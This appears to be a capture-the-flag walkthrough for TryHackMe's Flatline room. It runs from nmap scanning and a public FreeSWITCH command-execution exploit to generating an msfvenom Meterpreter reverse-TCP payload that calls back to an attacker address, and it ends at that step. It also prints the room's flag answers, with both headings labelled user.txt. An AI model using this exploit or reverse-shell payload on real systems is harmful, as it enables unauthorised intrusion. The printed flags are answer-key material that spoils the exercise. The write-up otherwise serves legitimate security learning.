<div align="center">[Flatline TryHackMe Walkthrough — Complete Step-by-Step Guide to Root](https://tryhackme.com/room/flatline)</div>


## Task 1 . Flags

### 1.1. What is the user.txt flag?
```
THM{64bca0843d535fa733eecdc59d27cbe26}
```
### 1.2. What is the user.txt flag?
```
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```

## Initial Enumeration

As always, I kicked things off with an **Nmap scan** to enumerate the open services running on the target machine (`10.201.79.236`). I used the following command:

```bash
nmap -sV -sC -Pn 10.201.79.236
```

* `-sV` → Detects service versions
* `-sC` → Runs default Nmap scripts for additional info
* `-Pn` → Skips host discovery (treats host as online)

The scan revealed two interesting open ports:

```
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```

* Port **3389 (RDP)** indicated that the machine was running Microsoft’s Remote Desktop Service.
* Port **8021 (FreeSWITCH mod\_event\_socket)** caught my attention, since FreeSWITCH is a VoIP service that has been known to contain vulnerabilities.

The domain name of the system was also disclosed as:

```
WIN-EOM4PK0578N
```

At this point, my main focus shifted toward the **FreeSWITCH service** to check if it was exploitable.

---

## Finding Vulnerabilities

I searched Exploit-DB using `searchsploit` to see if there were any publicly available exploits for FreeSWITCH:

```bash
searchsploit FreeSWITCH
```

The results looked promising:

```
-$ searchsploit Freeswitch
--------------------------------------------------------- ---------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit) | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                    | windows/remote/47799.txt
--------------------------------------------------------- ---------------------------
```

The second one looked like a straightforward **remote code execution (RCE)** exploit, so I pulled the exploit file for review:

```bash
searchsploit -m windows/remote/47799.txt
cat 47799.txt
```

Inside, I found an example usage that confirmed command execution was possible via the FreeSWITCH event socket.

---

## Exploitation

I decided to test the exploit directly by executing a simple `whoami` command against the target:

```bash
python3 47799.txt 10.201.79.236 whoami
```

The exploit worked!

```
Authenticated
win-eom4pk0578n\nekrotic
```

That confirmed I had remote command execution on the machine as the **Nekrotic** user.

---

## Exploring the File System

With code execution in place, I explored the `C:\` drive to see the file structure:

```bash
python3 47799.txt 10.201.79.236 "dir C:\"
```

Output:

```
PerfLogs
Program Files
Program Files (x86)
projects
Users
Windows
```

Inside the **Users** directory, I found two accounts:

* Administrator
* Nekrotic

Naturally, I went straight for `Nekrotic\Desktop` to check for any flags.

```bash
python3 47799.txt 10.201.79.236 "dir C:\Users\Nekrotic\Desktop"
```

And there they were:

```
user.txt
root.txt
```

---

## Hurdles with Flag Extraction

I attempted to read the `user.txt` flag using multiple variations of the `type` and `cat` commands:

```bash
python3 47799.txt 10.201.79.236 "type C:\Users\Nekrotic\Desktop\user.txt"
python3 47799.txt 10.201.79.236 "cat C:\Users\Nekrotic\Desktop\user.txt"
python3 47799.txt 10.201.79.236 "powershell cat C:\Users\Nekrotic\Desktop\user.txt"
```

Unfortunately, the responses either hung or returned errors. It seemed this exploit had limitations when it came to reading file contents directly.

---

## Reverse Shell

Since direct flag extraction wasn’t working, I shifted my approach to gaining a more **stable reverse shell**. I generated a payload with `msfvenom`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.29.222 LPORT=8888 -f exe > shell.exe
```

This would give me a proper Meterpreter session once executed, making file interaction much easier.

<img width="1116" height="134" alt="image" src="https://github.com/user-attachments/assets/2638a694-7862-469f-a01d-d4a09ed97992" />
